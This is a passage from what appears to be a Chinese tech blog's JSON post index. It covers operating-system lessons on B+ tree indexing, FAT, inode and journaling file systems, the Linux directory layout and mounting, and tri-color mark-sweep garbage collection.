的操作是在更快的 CPU 缓存中执行的。而且即便穿透，内存操作也是在纳秒级别可以完成。 但是，这个逻辑在磁盘中是不存在树的范围查找和聚合运算更快。 B 树和 B+ 树二叉搜索树解决了连续结构插入新元素开销很大的问题，同时又保持着天然的二分结构。但是，当需要索引的数据量很大，无法在一个磁盘 Block 中存下整棵二叉搜索树的时候。每一次递归向下的搜索，实际都是读取不同的磁盘块。这个时候二叉搜索树的开销很大。 试想一个一万亿条订单的表，进行 40 次查找找到答案，在内存中不是问题，要考虑到 CPU 缓存有 90% 以上的命中率（当然前提是内存足够大）。通常情况下我们没有这么大的内存空间，如果 40 次查找发生在磁盘上，也是非常耗时的。那么有没有更好的方案呢？ 一个更好的方案，就是继续沿用树状结构，利用好磁盘的分块让每个节点多一些数据，并且允许子节点也多一些，树就会更矮。因为树的高度决定了搜索的次数。 上图中我们构造的树被称为 B 树（B-Tree），开头说过，B 这个字母具体是哪个单词或者人名的缩写，至今有争议，具体你可以查查资料。 B-Tree 是一种递归的搜索结构，与二叉搜索树非常类似。不同的是，B 树中的父节点中的数据会对子树进行区段分割。比如上图中节点 1 有 3 个子节点，并用数字 9,30 对子树的区间进行了划分。 上图中的 B 树是一个 3-4 B 树，3 指的是每个非叶子节点允许最大 3 个索引，4 指的是每个节点最多允许 4 个子节点，4 也指每个叶子节点可以存 4 个索引。上面只是一个例子，在实际的操作中，子节点有几十个、甚至上百个索引也很常见，因为我们希望树变矮，好减少磁盘操作。 B 树的每个节点是一个索引条目（例如：一个 &lt;订单 ID，序号&gt; 的组合），如果是行数据库可以索引到一条存储在磁盘上的记录。 继承 B 树：B+ 树为了达到最高的效率，实战中我们往往使用的是一种继承于 B 树设计的结构，称为 B+ 树。B+ 树只有叶子节点才映射数据，下图中是对 B 树设计的一种改进，节点 1 为冗余节点，它不存储数据，只划定子树数据的范围。你可以看到节点 1 的索引 Key：12 和 30，在节点 3 和 4 中也有一份。 树的形成：插入下面我以一棵 2-3 B+ 树来演示 B+ 树的插入过程。2 指的是 B+ 树每个非叶子节点允许 2 个数据，叶子节点最多允许 3 个索引，每个节点允许最多 3 个子节点。我们要在 2-3 B+ 树中依次插入 3,6,9,12,19,15,26,8,30。下图是演示： 插入 3,6,9 过程很简单，都写入一个节点即可，因为叶子节点最多允许每个 3 个索引。接下来我们插入 12，会发生一次过载，然后节点就需要拆分，这个时候按照 B+ 树的设计会产生冗余节点。 然后插入 15 非常简单，直接加入即可： 接下来插入 19， 这个时候下图中红色部分发生过载： 因此需要拆分节点数据，我们从中间把红色的节点拆开，15 作为冗余的索引写入父节点，就形成下图的情况： 接着插入 26， 写入到对应位置即可。 接下来，插入 8 到对应位置即可。 然后我们插入 30，此时右边节点发生过载： 解决完一次过载问题之后，因为 26 会浮上去，根节点又发生了过载： 再次解决过载，拆分红色部分，得到最后结果： 在上述过程中，B+ 树始终可以保持平衡状态，而且所有叶子节点都在同一层级。更复杂的数学证明，我就不在这里讲解了。不过建议对算法感兴趣对同学，可以学习《算法导论》中关于树的部分。 插入和删除效率B+ 树有大量的冗余节点，比如删除一个节点的时候，可以直接从叶子节点中删除，甚至可以不动非叶子节点。这样删除非常快。B 树则不同，B 树没有冗余节点，删除节点的时候非常复杂。比如删除根节点中的数据，可能涉及复杂的树的变形。 B+ 树的插入也是一样，有冗余节点，插入可能存在节点的拆分（如果节点饱和），但是最多只涉及树的一条路径。而且 B+ 树会自动平衡，不需要更多复杂的算法，类似红黑树的旋转操作等。 因此，B+ 树的插入和删除效率更高。 搜索：链表的作用B 树和 B+ 树搜索原理基本一致。先从根节点查找，然后对比目标数据的范围，最后递归的进入子节点查找。 你可能会注意到，B+ 树所有叶子节点间还有一个链表进行连接。这种设计对范围查找非常有帮助，比如说我们想知道 1 月 20 日和 1 月 22 日之间的订单，这个时候可以先查找到 1 月 20 日所在的叶子节点，然后利用链表向右遍历，直到找到 1 月22 日的节点。这样我们就进一步节省搜索需要的时间。 总结这一讲我们学习了在数据库中如何利用文件系统造索引。无论是行存储还是列存储，构造索引的过程都是类似的。索引有很多做法，除了 B+ 树，还有 HashTable、倒排表等。如果是存储海量数据的数据库，我们的思考点需要放在 I/O 的效率上。如果把今天的知识放到分布式数据库上，那除了需要节省磁盘读写还需要节省网络 I/O。 那么通过这一讲的学习，你现在可以尝试来回答本讲关联的面试题目：MySQL 中的 B 树和 B+ 树有什么区别？ 【解析】B+ 树继承于 B 树，都限定了节点中数据数目和子节点的数目。B 树所有节点都可以映射数据，B+ 树只有叶子节点可以映射数据。 单独看这部分设计，看不出 B+ 树的优势。为了只有叶子节点可以映射数据，B+ 树创造了很多冗余的索引（所有非叶子节点都是冗余索引），这些冗余索引让 B+ 树在插入、删除的效率都更高，而且可以自动平衡，因此 B+ 树的所有叶子节点总是在一个层级上。所以 B+ 树可以用一条链表串联所有的叶子节点，也就是索引数据，这让 B+ 树的范围查找和聚合运算更快。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"文件系统底层实现","slug":"计操/文件系统的底层实现","date":"2021-07-25T18:00:48.000Z","updated":"2021-08-07T09:16:18.489Z","comments":true,"path":"2021/07/26/计操/文件系统的底层实现/","link":"","permalink":"https://www.shanghua.live/2021/07/26/%E8%AE%A1%E6%93%8D/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"10 年前 FAT 文件系统还是常见的格式，而现在 Windows 上主要是 NTFS，Linux 上主要是 Ext3、Ext4 文件系统。关于这块知识，一般资料只会从支持的磁盘大小、数据保护、文件名等各种维度帮你比较，但是最本质的内容却被一笔带过。它们最大的区别是文件系统的实现不同，具体怎么不同？文件系统又有哪些实现？这一讲，我将带你一起来探索和学习这部分知识。 硬盘分块在了解文件系统实现之前，我们先来了解下操作系统如何使用硬盘。 使用硬盘和使用内存有一个很大的区别，内存可以支持到字节级别的随机存取，而这种情况在硬盘中通常是不支持的。过去的机械硬盘内部是一个柱状结构，有扇区、柱面等。读取硬盘数据要转动物理的磁头，每转动一次磁头时间开销都很大，因此一次只读取一两个字节的数据，非常不划算。 随着 SSD 的出现，机械硬盘开始逐渐消失（还没有完全结束），现在的固态硬盘内部是类似内存的随机存取结构。但是硬盘的读写速度还是远远不及内存。而连续读多个字节的速度，还远不如一次读一个硬盘块的速度。 因此，为了提高性能，通常会将物理存储（硬盘）划分成一个个小块，比如每个 4KB。这样做也可以让硬盘的使用看起来非常整齐，方便分配和回收空间。况且，数据从磁盘到内存，需要通过电子设备，比如 DMA、总线等，如果一个字节一个字节读取，速度较慢的硬盘就太耗费时间了。过去的机械硬盘的速度可以比内存慢百万倍，现在的固态硬盘，也会慢几十到几百倍。即便是最新的 NvMe 接口的硬盘，和内存相比速度仍然有很大的差距。因此，一次读/写一个块（Block）才是可行的方案。 如上图所示，操作系统会将磁盘分成很多相等大小的块。这样做还有一个好处就是如果你知道块的序号，就可以准确地计算出块的物理位置。 文件的描述我们将硬盘分块后，如何利用上面的硬盘存储文件，就是文件系统（File System）要负责的事情了。当然目录也是一种文件，因此我们先讨论文件如何读写。不同的文件系统利用方式不同，今天会重点讨论 3 种文件系统： 早期的 FAT 格式 基于 inode 的传统文件系统 日志文件系统（如 NTFS, EXT2、3、4） FAT 表早期人们找到了一种方案就是文件分配表（File Allocate Table，FAT）。如下图所示： 一个文件，最基本的就是要描述文件在硬盘中到底对应了哪些块。FAT 表通过一种类似链表的结构描述了文件对应的块。上图中：文件 1 从位置 5 开始，这就代表文件 1 在硬盘上的第 1 个块的序号是 5 的块 。然后位置 5 的值是 2，代表文件 1 的下一个块的是序号 2 的块。顺着这条链路，我们可以找到 5 → 2 → 9 → 14 → 15 → -1。-1 代表结束，所以文件 1 的块是：5,2,9,14,15。同理，文件 2 的块是 3,8,12。 FAT 通过一个链表结构解决了文件和物理块映射的问题，算法简单实用，因此得到过广泛的应用，到今天的 Windows/Linux/MacOS 都还支持 FAT 格式的文件系统。FAT 的缺点就是非常占用内存，比如 1T 的硬盘，如果块的大小是 1K，那么就需要 1G 个 FAT 条目。通常一个 FAT 条目还会存一些其他信息，需要 2~3 个字节，这就又要占用 2-3G 的内存空间才能用 FAT 管理 1T 的硬盘空间。显然这样做是非常浪费的，问题就出在了 FAT 表需要全部维护在内存当中。 索引节点（inode）为了改进 FAT 的容量限制问题，可以考虑为每个文件增加一个索引节点（inode）。这样，随着虚拟内存的使用，当文件导入内存的时候，先导入索引节点（inode），然后索引节点中有文件的全部信息，包括文件的属性和文件物理块的位置。 如上图，索引节点除了属性和块的位置，还包括了一个指针块的地址。这是为了应对文件非常大的情况。一个大文件，一个索引节点存不下，需要通过指针链接到其他的块去描述文件。 这种文件索引节点（inode）的方式，完美地解决了 FAT 的缺陷，一直被沿用至今。FAT 要把所有的块信息都存在内存中，索引节点只需要把用到的文件形成数据结构，而且可以使用虚拟内存分配空间，随着页表置换，这就解决了 FAT 的容量限制问题。 目录的实现有了文件的描述，接下来我们来思考如何实现目录（Directory）。目录是特殊的文件，所以每个目录都有自己的 inode。目录是文件的集合，所以目录的内容中必须有所有其下文件的 inode 指针。 文件名也最好不要放到 inode 中，而是放到文件夹中。这样就可以灵活设置文件的别名，及实现一个文件同时在多个目录下。 如上图，/foo 和 /bar 两个目录中的 b.txt 和 c.txt 其实是一个文件，但是拥有不同的名称。这种形式我们称作“硬链接”，就是多个文件共享 inode。 硬链接有一个非常显著的特点，硬链接的双方是平等的。上面的程序我们用ln指令为文件 a 创造了一个硬链接b。如果我们创造完删除了 a，那么 b 也是可以正常工作的。如果要删除掉这个文件的 inode，必须 a,b 同时删除。这里你可以看出 a,b 是平等的。 和硬链接相对的是软链接，软链接的原理如下图： 图中c.txt是b.txt的一个软链接，软链接拥有自己的inode，但是文件内容就是一个快捷方式。因此，如果我们删除了b.txt，那么b.txt对应的 inode 也就被删除了。但是c.txt依然存在，只不过指向了一个空地址（访问不到）。如果删除了c.txt，那么不会对b.txt造成任何影响。 在 Linux 中可以通过ln -s创造软链接。 1ln -s a b # 将b设置为a的软链接(b是a的快捷方式) 以上，我们对文件系统的实现有了一个初步的了解。从整体设计上，本质还是将空间切块，然后划分成目录和文件管理这些分块。读、写文件需要通过 inode 操作磁盘。操作系统提供的是最底层读写分块的操作，抽象成文件就交给文件系统。比如想写入第 10001 个字节，那么会分成这样几个步骤： 修改内存中的数据 计算要写入第几个块 查询 inode 找到真实块的序号 将这个块的数据完整的写入一次磁盘 你可以思考一个问题，如果频繁读写磁盘，上面这个模型会有什么问题 解决性能和故障：日志文件系统在传统的文件系统实现中，inode 解决了 FAT 容量限制问题，但是随着 CPU、内存、传输线路的速度越来越快，对磁盘读写性能的要求也越来越高。传统的设计，每次写入操作都需要进行一次持久化，所谓“持久化”就是将数据写入到磁盘，这种设计会成为整个应用的瓶颈。因为磁盘速度较慢，内存和 CPU 缓存的速度非常快，如果 CPU 进行高速计算并且频繁写入磁盘，那么就会有大量线程阻塞在等待磁盘 I/O 上。磁盘的瓶颈通常在写入上，因为通常读取数据的时候，会从缓存中读取，不存在太大的瓶颈。 加速写入的一种方式，就是利用缓冲区。 上图中所有写操作先存入缓冲区，然后每过一定的秒数，才进行一次持久化。 这种设计，是一个很好的思路，但最大的问题在于容错。 比如上图的步骤 1 或者步骤 2 只执行了一半，如何恢复？如果步骤 2 只写入了一半，那么数据就写坏了。如果步骤 1 只写入了一半，那么数据就丢失了。无论出现哪种问题，都不太好处理。更何况写操作和写操作之间还有一致性问题，比如说一次删除 inode 的操作后又发生了写入…… 解决上述问题的一个非常好的方案就是利用日志。假设 A 是文件中某个位置的数据，比起传统的方案我们反复擦写 A，日志会帮助我们把 A 的所有变更记录下来，比如： 123A=1A=2A=3 上面 A 写入了 3 次，因此有 3 条日志。日志文件系统文件中存储的就是像上面那样的日志，而不是文件真实的内容。当用户读取文件的时候，文件内容会在内存中还原，所以内存中 A 的值是 3，但实际磁盘上有 3 条记录。 从性能上分析，如果日志造成了 3 倍的数据冗余，那么读取的速度并不会真的慢三倍。因为我们多数时候是从内存和 CPU 缓存中读取数据。而写入的时候，因为采用日志的形式，可以考虑下图这种方式，在内存缓冲区中积累一批日志才写入一次磁盘。 上图这种设计可以让写入变得非常快速，多数时间都是写内存，最后写一次磁盘。而上图这样的设计成不成立，核心在能不能解决容灾问题。 你可以思考一下这个问题——丢失一批日志和丢失一批数据的差别大不大。其实它们之间最大的差别在于，如果丢失一批日志，只不过丢失了近期的变更；但如果丢失一批数据，那么就可能造成永久伤害。 举个例子，比如说你把最近一天的订单数据弄乱了，你可以通过第三方支付平台的交易流水、系统的支付记录等帮助用户恢复数据，还可以通过订单关联的用户信息查询具体是哪些用户的订单出了问题。但是如果你随机删了一部分订单， 那问题就麻烦了。你要去第三发支付平台调出所有流水，用大数据引擎进行分析和计算。 为了进一步避免损失，一种可行的方案就是创建还原点（Checkpoint），比如说系统把最近 30s 的日志都写入一个区域中。下一个 30s 的日志，写入下一个区域中。每个区域，我们称作一个还原点。创建还原点的时候，我们将还原点涂成红色，写入完成将还原点涂成绿色。 如上图，当日志文件系统写入磁盘的时候，每隔一段时间就会把这段时间内的所有日志写入一个或几个连续的磁盘块，我们称为还原点（Checkpoint）。操作系统读入文件的时候，依次读入还原点的数据，如果是绿色，那么就应用这些日志，如果是红色，就丢弃。所以上图中还原点 3 的数据是不完整的，这个时候会丢失不到 30s 的数据。如果将还原点的间隔变小，就可以控制风险的粒度。另外，我们还可以对还原点 3 的数据进行深度恢复，这里可以有人工分析，也可以通过一些更加复杂的算法去恢复。 总结这一讲我们学习了 3 种文件系统的实现，我们再来一起总结回顾一下。 FAT 的设计简单高效，如果你要自己管理一定的空间，可以优先考虑这种设计。 inode 的设计在内存中创造了一棵树状结构，对文件、目录进行管理，并且索引到磁盘中的数据。这是一种经典的数据结构，这种思路会被数据库设计、网络资源管理、缓存设计反复利用。 日志文件系统——日志结构简单、容易存储、按时间容易分块，这样的设计非常适合缓冲、批量写入和故障恢复。 现在我们很多分布式系统的设计也是基于日志，比如 MySQL 同步数据用 binlog，Redis 的 AOF，著名的分布式一致性算法 Paxos ，因此 Zookeeper 内部也在通过实现日志的一致性来实现分布式一致性。 FAT、NTFS 和 Ext3 有什么区别？ FAT 通过内存中一个类似链表的结构，实现对文件的管理。NTFS 和 Ext3 是日志文件系统，它们和 FAT 最大的区别在于写入到磁盘中的是日志，而不 是数据。日志文件系统会先把日志写入到内存中一个高速缓冲区，定期写入到磁盘。日志写入是追加式的，不用考虑数据的覆盖。一段时间内的日志内容，会形成还原点。这种设计大大提高了性能，当然也会有一定的数据冗余。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"Linux 下的各个目录有什么","slug":"计操/Linux下的各个目录有什么","date":"2021-07-25T15:53:27.000Z","updated":"2021-07-26T03:50:46.353Z","comments":true,"path":"2021/07/25/计操/Linux下的各个目录有什么/","link":"","permalink":"https://www.shanghua.live/2021/07/25/%E8%AE%A1%E6%93%8D/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E6%9C%89%E4%BB%80%E4%B9%88/","excerpt":"","text":"文件系统。学习文件系统的意义在于文件系统有很多设计思路可以迁移到实际的工作场景中，比如： MySQL 的 binlog 和 Redis AOF 都像极了日志文件系统的设计； B Tree 用于加速磁盘数据访问的设计，对于索引设计也有通用的意义。 特别是近年来分布式系统的普及，学习分布式文件系统，也是理解分布式架构最核心的一个环节。其实文件系统最精彩的还是虚拟文件系统的设计，比如 Linux 可以支持每个目录用不同的文件系统。这些文件看上去是一个个目录和文件，实际上可能是磁盘、内存、网络文件系统、远程磁盘、网卡、随机数产生器、输入输出设备等，这样虚拟文件系统就成了整合一切设备资源的平台。大量的操作都可以抽象成对文件的操作，程序的书写就会完整而统一，且扩展性强。 这一讲，我会从 Linux 的目录结构和用途开始，带你认识 Linux 的文件系统。Linux 所有的文件都建立在虚拟文件系统（Virtual File System ，VFS）之上，如下图所示： 当你访问一个目录或者文件，虽然用的是 Linux 标准的文件 API 对文件进行操作，但实际操作的可能是磁盘、内存、网络或者数据库等。因此，Linux 上不同的目录可能是不同的磁盘，不同的文件可能是不同的设备。 分区结构在 Linux 中，/是根目录。，每个目录可以是不同的文件系统（不同的磁盘或者设备）。你可能会问我，/是对应一个磁盘还是多个磁盘呢？在/创建目录的时候，目录属于哪个磁盘呢？ 你可以用 df -h 查看上面两个问题的答案，在上图中我的/挂载到了 /dev/mapper/vgubuntu-root 上。如果你想要看到更多信息，可以使用 df -T，如下图所示： /的文件系统类型是ext4。这是一种常用的日志文件系统。然后你可能还会有一个疑问， /dev/mapper/vgubuntu-root 究竟是一块磁盘还是别的什么？这个时候你可以用fdisk -l查看，结果如下图： 你可以看到我的 Linux 虚拟机上，有一块 30G 的硬盘（当然是虚拟的）。然后这块硬盘下有 3 个设备（Device）：/dev/sda1, /dev/sda2 和 /dev/sda5。在 Linux 中，数字 1~4 结尾的是主分区，通常一块磁盘最多只能有 4 个主分区用于系统启动。主分区之下，还可以再分成若干个逻辑分区，4 以上的数字都是逻辑分区。因此 /dev/sda2 和 /dev/sda5 是主分区包含逻辑分区的关系。 挂载分区结构最终需要最终挂载到目录上。上面例子中 /dev/sda5 分区被挂载到了/下。 这样在/创建的文件都属于这个/dev/sda5分区。 另外，/dev/sda5采用ext4文件系统。可见不同的目录可以采用不同的文件系统。 将一个文件系统映射到某个目录的过程叫作挂载（Mount）。当然这里的文件系统可以是某个分区、某个 USB 设备，也可以是某个读卡器等。你可以用mount -l查看已经挂载的文件系统。 上图中的 sysfs proc devtmpfs tmpfs ext4 都是不同的文件系统，下面我们来说说它们的作用。 sysfs 让用户通过文件访问和设置设备驱动信息。proc 是一个虚拟文件系统，让用户可以通过文件访问内核中的进程信息。devtmpfs 在内存中创造设备文件节点。tmpfs 用内存模拟磁盘文件。ext4 是一个通常意义上我们认为的文件系统，也是管理磁盘上文件用的系统。 你可以看到挂载记录中不仅有文件系统类型，挂载的目录（on 后面部分），还有读写的权限等。你也可以用 mount 指令挂载一个文件系统到某个目录，比如说： 1mount /dev/sda6 /abc 上面这个命令将/dev/sda6挂载到目录abc。 目录结构因为 Linux 内文件系统较多，用途繁杂，Linux 对文件系统中的目录进行了一定的归类，如下图所示： 最顶层的目录称作根目录， 用/表示。/目录下用户可以再创建目录，但是有一些目录随着系统创建就已经存在，接下来我会和你一起讨论下它们的用途。 /bin（二进制） 包含了许多所有用户都可以访问的可执行文件，如 ls, cp, cd 等。这里的大多数程序都是二进制格式的，因此称作bin目录。bin是一个命名习惯，比如说nginx中的可执行文件会在 Nginx 安装目录的 bin 文件夹下面。 /dev（设备文件） 通常挂载在devtmpfs文件系统上，里面存放的是设备文件节点。通常直接和内存进行映射，而不是存在物理磁盘上。 值得一提的是其中有几个有趣的文件，它们是虚拟设备。 /dev/null 是可以用来销毁任何输出的虚拟设备。你可以用&gt;重定向符号将任何输出流重定向到/dev/null来忽略输出的结果。 /dev/zero 是一个产生数字 0 的虚拟设备。无论你对它进行多少次读取，都会读到 0。 /dev/ramdom 是一个产生随机数的虚拟设备。读取这个文件中数据，你会得到一个随机数。你不停地读取这个文件，就会得到一个随机数的序列。 /etc（配置文件），/etc名字的含义是and so on……，也就是“等等及其他”，Linux 用它来保管程序的配置。比如说mysql通常会在/etc/mysql下创建配置。再比如说/etc/passwd是系统的用户配置，存储了用户信息。 /proc（进程和内核文件） 存储了执行中进程和内核的信息。比如你可以通过/proc/1122目录找到和进程1122关联的全部信息。还可以在/proc/cpuinfo下找到和 CPU 相关的全部信息。 /sbin（系统二进制） 和/bin类似，通常是系统启动必需的指令，也可以包括管理员才会使用的指令。 /tmp（临时文件） 用于存放应用的临时文件，通常用的是tmpfs文件系统。因为tmpfs是一个内存文件系统，系统重启的时候清除/tmp文件，所以这个目录不能放应用和重要的数据。 /var （Variable data file,，可变数据文件） 用于存储运行时的数据，比如日志通常会存放在/var/log目录下面。再比如应用的缓存文件、用户的登录行为等，都可以放到/var目录下，/var下的文件会长期保存。 /boot（启动） 目录下存放了 Linux 的内核文件和启动镜像，通常这个目录会写入磁盘最头部的分区，启动的时候需要加载目录内的文件。 /opt（Optional Software，可选软件） 通常会把第三方软件安装到这个目录。以后你安装软件的时候，可以考虑在这个目录下创建。 /root（root 用户家目录） 为了防止误操作，Linux 设计中 root 用户的家目录没有设计在/home/root下，而是放到了/root目录。 /home（家目录） 用于存放用户的个人数据，比如用户lagou的个人数据会存放到/home/lagou下面。并且通常在用户登录，或者执行cd指令后，都会在家目录下工作。 用户通常会对自己的家目录拥有管理权限，而无法访问其他用户的家目录。 /media（媒体） 自动挂载的设备通常会出现在/media目录下。比如你插入 U 盘，通常较新版本的 Linux 都会帮你自动完成挂载，也就是在/media下创建一个目录代表 U 盘。 /mnt（Mount，挂载） 我们习惯把手动挂载的设备放到这个目录。比如你插入 U 盘后，如果 Linux 没有帮你完成自动挂载，可以用mount命令手动将 U 盘内容挂载到/mnt目录下。 /svr（Service Data,，服务数据） 通常用来存放服务数据，比如说你开发的网站资源文件（脚本、网页等）。不过现在很多团队的习惯发生了变化， 有的团队会把网站相关的资源放到/www目录下，也有的团队会放到/data下。总之，在存放资源的角度，还是比较灵活的。 /usr（Unix System Resource） 包含系统需要的资源文件，通常应用程序会把后来安装的可执行文件也放到这个目录下，比如说 vim编辑器的可执行文件通常会在/usr/bin目录下，区别于ls会在/bin目录下 /usr/sbin 中会包含有通常系统管理员才会使用的指令。 /usr/lib 目录中存放系统的库文件，比如一些重要的对象和动态链接库文件。 /usr/lib 目录下会有大量的.so文件，这些叫作Shared Object，类似windows下的dll文件。 /usr/share 目录下主要是文档，比如说 man 的文档都在/usr/share/man下面。 总结这一讲我们了解了 Linux 虚 拟文件系统的设计，并且熟悉了 Linux 的目录结构。我曾经看到不少程序员把程序装到了/home目录，也看到过不少程序员将数据放到了/root目录。这样做并不会带来致命性问题，但是会给其他和你一起工作的同事带来困扰。 今天我们讲到的这些规范是整个世界通用的，如果每个人都能遵循规范的原则，工作起来就会有很好的默契。登录一台linux服务器，你可以通过目录结构快速熟悉。你可以查阅/etc下的配置，看看/opt下装了什么软件，这就是规范的好处。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"内存回收上篇","slug":"计操/内存回收下篇","date":"2021-07-25T15:08:23.000Z","updated":"2021-07-25T07:56:52.289Z","comments":true,"path":"2021/07/25/计操/内存回收下篇/","link":"","permalink":"https://www.shanghua.live/2021/07/25/%E8%AE%A1%E6%93%8D/%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E4%B8%8B%E7%AF%87/","excerpt":"","text":"今天我们继续讨论内存回收问题。在上一讲，我们发现双色标记-清除算法有一个明显的问题，如下图所示： 你可以把 GC 的过程看作标记、清除及程序不断对内存进行修改的过程，分成 3 种任务： 标记程序（Mark） 清除程序（Sweep） 变更程序（Mutation） 标记（Mark）就是找到不用的内存，清除（Sweep）就是回收不用的资源，而修改（Muation）则是指用户程序对内存进行了修改。通常情况下，在 GC 的设计中，上述 3 种程序不允许并行执行（Simultaneously）。对于 Mark、Sweep、Mutation 来说内存是共享的。如果并行执行相当于需要同时处理大量竞争条件的手段，这会增加非常多的开销。当然你可以开多个线程去 Mark、Mutation 或者 Sweep，但前提是每个过程都是独立的。 因为 Mark 和 Sweep 的过程都是 GC 管理，而 Mutation 是在执行应用程序，在实时性要求高的情况下可以允许一边 Mark，一边 Sweep 的情况； 优秀的算法设计也可能会支持一边 Mark、一边 Mutation 的情况。这种算法通常使用了 Read On Write 技术，本质就是先把内存拷贝一份去 Mark/Sweep，让 Mutation 完全和 Mark 隔离。 上图中 GC 开始后，拷贝了一份内存的原本，进行 Mark 和 Sweep，整理好内存之后，再将原本中所有的 Mutation 合并进新的内存。 这种算法设计起来会非常复杂，但是可以保证实时性 GC。 上图的这种 GC 设计比较少见，通常 GC 都会发生 STL（Stop The World）问题，Mark/Sweep/Mutation 只能够交替执行。也就是说， 一种程序执行的时候，另一种程序必须停止。 对于双色标记-清除算法，如果 Mark 和 Sweep 之间存在 Mutation，那么 Mutation 的伤害是比较大的。比如 Mutation 新增了一个白色的对象，这个白色的对象就可能会在 Sweep 启动后被清除。当然也可以考虑新增黑色的对象，这样对象就不会在 Sweep 启动时被回收。但是会发生下面这个问题，如下图所示： 如果一个新对象指向了一个已经删除的对象，一个新的黑色对象指向了一个白色对象，这个时候 GC 不会再遍历黑色对象，也就是白色的对象还是会被清除。因此，我们希望创建一个在并发环境更加稳定的程序，让 Mark/Mutation/Sweep 可以交替执行，不用特别在意它们之间的关联。 有一个非常优雅地实现就是再增加一种中间的灰色，把灰色看作可以增量处理的工作，来重新定义白色的含义。 三色标记-清除算法（Tri-Color Mark Sweep）接下来，我会和你讨论这种有三个颜色标记的算法，通常称作三色标记-清除算法。首先，我们重新定义黑、白、灰三种颜色的含义： 白色代表需要 GC 的对象； 黑色代表确定不需要 GC 的对象； 灰色代表可能不需要 GC 的对象，但是还未完成标记的任务，也可以认为是增量任务。 在三色标记-清除算法中，一开始所有对象都染成白色。初始化完成后，会启动标记程序。在标记的过程中，是可以暂停标记程序执行 Mutation。 算法需要维护 3 个集合，白色集合、黑色集合、灰色集合。3 个集合是互斥的，对象只能在一个集合中。执行之初，所有对象都放入白色集合，如下图所示： 第一次执行，算法将 Root 集合能直接引用的对象加入灰色集合，如下图所示： 接下来算法会不断从灰色集合中取出元素进行标记，主体标记程序如下： 1234while greySet.size() &gt; 0 &#123; var item = greySet.remove(); mark(item);&#125; 标记的过程主要分为 3 个步骤： 如果对象在白色集合中，那么先将对象放入灰色集合； 然后遍历节点的所有的引用对象，并递归所有引用对象； 当一个对象的所有引用对象都在灰色集合中，就把这个节点放入为黑色集合。 伪代码如下： 12345678910func mark(obj) &#123; if obj in whiteSet &#123; greySet.add(obj) for v in refs(obj) &#123; mark(v) &#125; greySet.remove(obj) blackSet.add(obj) &#125;&#125; 你可以观察下上面的程序，这是一个 DFS 的过程。如果多个线程对不同的 Root Object 并发执行这个算法，我们需要保证 3 个集合都是线程安全的，可以考虑利用 ConcurrentSet（这样性能更好），或者对临界区上锁。并发执行这个算法的时候，如果发现一个灰色节点说明其他线程正在处理这个节点，就忽略这个节点。这样，就解决了标记程序可以并发执行的问题。 当标记算法执行完成的时候，所有不需要 GC 的元素都会涂黑： 标记算法完成后，白色集合内就是需要回收的对象。 以上，是类似双色标记-清除算法的全量 GC 程序，我们从 Root 集合开始遍历，完成了对所有元素的标记（将它们放入对应的集合）。 接下来我们来考虑增加 GC（Incremental GC）的实现。首先对用户的修改进行分类，有这样 3 类修改（Mutation）需要考虑： 创建新对象 删除已有对象 调整已有引用 如果用户程序创建了新对象，可以考虑把新对象直接标记为灰色。虽然，也可以考虑标记为黑色，但是标记为灰色可以让 GC 意识到新增了未完成的任务。比如用户创建了新对象之后，新对象引用了之前删除的对象，就需要重新标记创建的部分。 如果用户删除了已有的对象，通常做法是等待下一次全量 Mark 算法处理。下图中我们删除了 Root Object 到 A 的引用，这个时候如果把 A 标记成白色，那么还需要判断是否还有其他路径引用到 A，而且 B,C 节点的颜色也需要重新计算。关键的问题是，虽然可以实现一个基于 A 的 DFS 去解决这个问题，但实际情况是我们并不着急解决这个问题，因为内存空间往往是有富余的。 在调整已有的引用关系时，三色标记算法的表现明显更好。下图是对象 B 将对 C 的引用改成了对 F 的引用，C,F 被加入灰色集合。接下来 GC 会递归遍历 C,F，最终然后 F,E,G 都会进入灰色集合。 内存回收就好比有人在随手扔垃圾，清洁工需要不停打扫。如果清洁工能够跟上人们扔垃圾的速度，那么就不需要太多的 STL（Stop The World）。如果清洁工跟不上扔垃圾的速度，最终环境就会被全部弄乱，这个时候清洁工就会要求“Stop The World”。三色算法的优势就在于它支持多一些情况的 Mutation，这样能够提高“垃圾”被并发回收的概率。 目前的 GC 主要都是基于三色标记算法。 至于清除算法，有原地回收算法，也有把存活下来的对象（黑色对象）全部拷贝到一个新的区域的算法。 碎片整理和生代技术三色标记-清除算法，还没有解决内存回收产生碎片的问题。通常，我们会在三色标记-清除算法之上，再构建一个整理内存（Compact）的算法。如下图所示： Compact 算法将对象重新挤压到一起，让更多空间可以被使用。我们在设计这个算法时，观察到了一个现象：新创建出来的对象，死亡（被回收）概率会更高，而那些已经存在了一段时间的对象，往往更不容易死亡。这有点类似 LRU 缓存，其实是一个概率问题。接下来我们考虑针对这个现象进行优化。 如上图所示，你可以把新创建的对象，都先放到一个统一的区域，在 Java 中称为伊甸园（Eden）。这个区域因为频繁有新对象死亡，因此需要经常 GC。考虑整理使用中的对象成本较高，因此可以考虑将存活下来的对象拷贝到另一个区域，Java 中称为存活区（Survior）。存活区生存下来的对象再进入下一个区域，Java 中称为老生代。 上图展示的三个区域，Eden、Survior 及老生代之间的关系是对象的死亡概率逐级递减，对象的存活周期逐级增加。三个区域都采用三色标记-清除算法。每次 Eden 存活下来的对象拷贝到 Survivor 区域之后，Eden 就可以完整的回收重利用。Eden 可以考虑和 Survivor 用 1:1 的空间，老生代则可以用更大的空间。Eden 中全量 GC 可以频繁执行，也可以增量 GC 混合全量 GC 执行。老生代中的 GC 频率可以更低，偶尔执行一次全量的 GC。 GC 的选择最后我们来聊聊 GC 的选择。通常选择 GC 会有实时性要求（最大容忍的暂停时间），需要从是否为高并发场景、内存实际需求等维度去思考。在选择 GC 的时候，复杂的算法并不一定更有效。下面是一些简单有效的思考和判断。 